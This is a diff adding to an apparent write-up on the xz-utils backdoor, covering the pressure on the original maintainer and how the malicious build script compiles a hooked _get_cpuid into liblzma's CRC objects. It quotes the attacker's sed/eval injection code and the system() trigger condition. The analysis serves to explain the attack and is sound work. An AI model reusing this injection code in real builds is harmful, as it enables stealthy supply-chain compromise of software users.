@@ -262,6 +262,9 @@ From Lasse Collin (original maintainer)
 
 [source](https://www.mail-archive.com/xz-devel@tukaani.org/msg00571.html)
 
+We can see that the pressure put on Lasse worked, but interestingly, regardless of their intent, the others complaints do seem somewhat valid.
+Development on xz-utils and xz for Java was slow and PRs with genuine features were open for months with no review or indication that it would be reviewed.
+This is what allowed Jia Tan to begin to lead development of xz-utils and eventually slip the backdoor in.
 
 
 # The Git History and Release
@@ -470,6 +473,12 @@ That `_get_cpuid` ends up editing the GOT tables which allows it to hijack RSA_p
 These files are compiled together to result in the final `.libs/liblzma_la-crc64_fast.o` which is dynamically linked into other projects at which point it hijacks the GOT tables.
 We do not have much experience with C build systems so we had to rely on [the same writeup](https://research.swtch.com/xz-script) to get started with our analysis
 
+It begins by creating a backup of the original object file incase the compilation doesn't succeed and then goes ahead with the compilation.
+
+```bash
+cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
+```
+
 ```bash
 V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
 eval $yosA
@@ -485,6 +494,57 @@ So the attacker added this `# 0 "src/liblzma/check/crc64_fast.c"` to the file wh
 
 ```bash
 sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
+```
+
+If the compilation of `src/liblzma/.libs/liblzma_la-crc64_fast.o` succeeds it continues on to build
+`src/liblzma/.libx/liblzma_la-crc32_fast.o`. 
+
+The same backup step as before occurs but for the 32 bit version.
+
+```bash
+cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
+```
+
+```bash
+if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
+sed "/include \"crc32_arm64.h\"/a \\$V" | \
+sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
+# This probably builds the backdoor after all the sed commands make edits to the source code
+$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
+```
+
+If both of those succeed we then link the object files into a shared object 
+
+```bash
+if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
+```
+
+Then there is a section of code that handles cleaning up if any of these fails along with removing any extraneous files from the linking step. We don't quite understand why it deletes all these files, but our guess is it's just checking that the link step will work. 
+
+```bash
+if test ! -f .libs/liblzma.so; then
+                    # Undo the previous conversion from underscore to dash
+                    mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
+                    mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+                fi
+                rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
+            else
+                # Undo the previous conversion from underscore to dash
+                mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
+                mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+            fi
+            rm -f .libs/liblzma_la-crc32-fast.o || true
+            rm -f .libs/liblzma_la-crc64-fast.o || true
+        else
+            # Undo the previous conversion from underscore to dash
+            mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
+            mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+        fi
+    else
+        # Undo the previous conversion from underscore to dash
+        mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
+    fi
+    rm -f liblzma_la-crc64-fast.o || true
 ```
 
 # The Backdoor
@@ -513,6 +573,7 @@ ChaCha20 encrypted blob:
 
 The ChaCha20 encrypted blob can be decrypted by using a, b, c as the key which also is the first half of the ED448 key. 
 According to the author, a, b, and c are also used to determine whether of not to execute the command portion of the blob below.
+If a*b+c is equal to 2, the command will be executed by a call to system().
 
 Decrypted blob:
 
@@ -528,8 +589,6 @@ Decrypted blob:
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 ```
 [source](https://github.com/amlweems/xzbot)
-
-The command will then be executed using system() if a*b+c = 2 and then sshd will report a ssh key authorization failure. 
 
 # Consequences
 
